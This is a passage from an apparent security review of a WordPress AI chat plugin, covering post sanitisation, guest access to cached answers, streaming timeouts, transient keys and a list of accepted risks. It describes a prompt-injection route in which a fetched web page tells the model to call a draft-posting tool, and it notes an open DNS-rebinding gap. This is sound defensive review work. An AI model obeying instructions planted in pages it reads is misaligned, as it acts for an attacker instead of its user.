173, 432`, `UsageMeter.php:111`, `DraftPostToolkit.php:188`, `UserPrefs.php:37`,
`Migrate04.php:227`), and the two `update_option()` calls that remain are not. The family is
consistent.

### `wp_kses_post` on drafts

Examined `src/Toolkit/DraftPostToolkit.php:178-205`.

Correct, and in the right order: `sanitize_text_field()` on the title and `wp_kses_post()` on
the body operate on the *real* values, and `wp_slash()` wraps the whole array afterwards, at
the `wp_insert_post()` call which unslashes. Sanitising after slashing would have kses'd the
backslashes; sanitising before and slashing at the write is right.

The surrounding guarantees hold too: the status is the literal `'draft'` and is not a
parameter, so a model-supplied `post_status` cannot reach it; the capability is the post
type's own from a shared constant (`TYPES`), asked with `user_can($userId, …)` about the
acting id rather than `current_user_can()`, so the check and the authorship are one id; and an
unknown `post_type` is refused by `TYPES[$type] ?? null` even though the enum parameter refuses
it first. `wp_kses_post()` is applied unconditionally, which is *stricter* than core (a user
with `unfiltered_html` would normally bypass it) — the right call for text a model wrote.

Prompt-injection chain, checked: a page fetched by `web_fetch` can address the model and ask
it to call `draft_post`. What that gets an attacker is bounded exactly as the docblock claims
— a draft, authored by the acting user, never published, body through `wp_kses_post`. Nothing
escalates.

### The shortcode guest path

Examined `src/Shortcodes/Chat.php:185-235, 361-380`.

**Sound.** A viewer who fails `is_user_logged_in() && current_user_can('edit_posts')` never
triggers a generation under any condition — the capability is a class constant and is *not*
filterable, deliberately. The only thing the `alpaca_bot/shortcode/allow_guests` filter can do
is serve a visitor a *cached* answer an editor already primed; with no cache entry they get the
login notice. So the guest's spend is zero and the guest's reach is "text a logged-in editor
already caused to be generated on this exact post". The cache key
(`md5(json([tag, postId, identity, cacheSeconds]))`) separates tag, post, generation-shaping
attributes and duration, so one page's prompt can never be served for another's and a
`cache="off"` twin can neither read from nor stand in for its cached sibling.

The `wp_is_rest_endpoint()` guard is the right one and its reasoning holds: without it a
`GET /wp/v2/posts?per_page=100` by an editor would serialise up to a hundred turns in one
request.

Cached output is rendered through the same `Markdown` (see I-2) or `esc_html`, and every
notice is escaped where it is built, so a guest-visible answer is held to the same allowlist as
an admin-visible one.

The residual risks on this surface are the ones the docblock already names as the feature's
shape rather than a defect — an author who can write shortcodes can write a prompt whose
answer nobody reads before it is public, billed to the first editor who views the page — plus
finding H-1, which reaches the *shim*, not this class.

### SSE resource exhaustion — is `set_time_limit(0)` bounded by the provider timeout?

**No.** See M-1. The bound is roughly `(maxIter + nudges) × provider.timeout`, plus a nested
provider call for every `summarize` tool call, and there is no wall-clock deadline anywhere.
The abort detection is sound (`ignore_user_abort(true)` plus a `connection_aborted()` check
after every frame, with `AgentStreamObserver` yielding an empty delta before each tool run so a
disconnected client is noticed *before* a tool's side effect rather than after — verified in
`Pipeline`/`StreamController:188-193`), and the docblock's "the window that remains is one
provider call" describes that correctly. Detection is not a bound, and the bound is what is
missing.

### Transient key collisions

Examined every `set_transient` call site. Five namespaces, no collisions and no length problem:

| Key | Shape | Max length | Notes |
| --- | --- | --- | --- |
| `alpaca_bot_models` | literal | 17 | site-wide model catalogue, 5-minute TTL |
| `alpaca_bot_usage_{id\|site}_{Y-m}` | int or the literal `site` | ~35 | user ids are ints, so `site` can only ever be the site row |
| `alpaca_bot_rl_{bucket}_{subject}_{YmdHi}` | `chat`, then an int id or `ip_` + 32-hex `wp_hash` | 67 | bucket is a fixed literal today; subject namespaces cannot overlap (`5` vs `ip_…`) |
| `alpaca_bot_stream_{token}` | 32 chars `[A-Za-z0-9]` | 50 | pattern-checked before use as a key |
| `alpaca_bot_shortcode_{md5}` | 32 hex | 53 | |

The longest key plus core's `_transient_timeout_` prefix is 86 characters, well under the
172-character ceiling where `set_transient()` starts failing silently. No two prefixes are a
prefix of one another in a way that a suffix could bridge. Nothing here is attacker-shaped:
the only caller-influenced component anywhere is the shortcode's md5, which is a fixed-width
digest.

---

## What we are accepting, and why

1. **DNS rebinding in `web_fetch` (H-1).** Closing it properly means pinning the resolved
   address into the transport, which is a compatibility question across cURL and fsockopen and
   a piece of work in its own right. Accepting it for 0.5.0 is defensible **only** if the
   operator-facing docs say so; today the argument lives in a source docblock where no site
   owner will read it. Ticket for 0.6, document now.
2. **The site's own host is exempt from the address table (L-1).** This is parity with
   `wp_http_validate_url()`. Diverging from core here would surprise operators who set
   `http_request_host_is_external` expecting one meaning. Accept.
3. **A capability filter can name `read` or `exist` (M-3, the brief's named question).** This
   is the feature. The guard blocks the accidental downgrade, which is the one that actually
   happens. Accept the design; fix the documentation, and consider a capability floor under
   `web_fetch` specifically.
4. **The stream route is not rate limited.** Correct as a billing decision — one POST, one hit,
   one turn. The exposure it creates is M-1's, and M-1 is where it should be fixed (a
   concurrency cap or a deadline), not by double-billing streamed turns.
5. **The rate limiter's fixed window (up to 2N across a boundary) and its floor of 1.** Both
   documented trades, both correct for a limiter that exists to stop runaway clients rather
   than to meter spend.
6. **Monthly caps default to 0 (unlimited).** A deliberate default; the limiter, not the cap,
   is the brake out of the box. Accept, but it is worth one line in the release notes that a
   site exposing chat to a wide role should set a cap.
7. **Stream tokens in the query string (I-1).** `EventSource`-shaped URLs are the reason, and
   the token is single-use, short-lived and user-bound. Accept.
8. **Prompt injection from fetched pages.** Not closable in general. The plugin's answer —
   bound what an injected instruction can *reach* (drafts only, never published, kses'd,
   authored as the acting user, capability re-checked) rather than trying to filter the text —
   is the right shape. Accept.
9. **Core's `wp_rest` nonce does not bind the route.** Core's model, not the plugin's. Accept.
10. **The 36 `ExceptionNotEscaped` PHPCS dismissals.** Re-examined at a sample; they are what
    the branch already independently confirmed. Accept.
